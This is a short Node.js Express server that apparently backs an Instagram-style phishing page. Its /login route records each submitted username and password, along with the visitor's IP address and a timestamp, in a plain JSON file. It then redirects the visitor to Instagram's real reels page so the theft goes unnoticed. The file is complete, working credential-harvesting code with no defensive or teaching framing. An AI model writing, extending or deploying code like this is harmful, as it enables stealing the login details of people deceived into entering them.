const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 3000;

// Configure paths
const DB_FILE = path.join(__dirname, 'logins.json');

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Handle form submission
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  // Initialize or read logins
  let logins = [];
  if (fs.existsSync(DB_FILE)) {
    logins = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
  }

  // Add new login
  logins.push({
    username,
    password,
    ip: req.ip,
    timestamp: new Date().toISOString()
  });

  // Save to file
  fs.writeFileSync(DB_FILE, JSON.stringify(logins, null, 2));

  // Respond with redirect instruction
  res.json({ redirect: 'https://www.instagram.com/reels/' });
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
  console.log(`Logins will be saved to: ${path.resolve(DB_FILE)}`);
});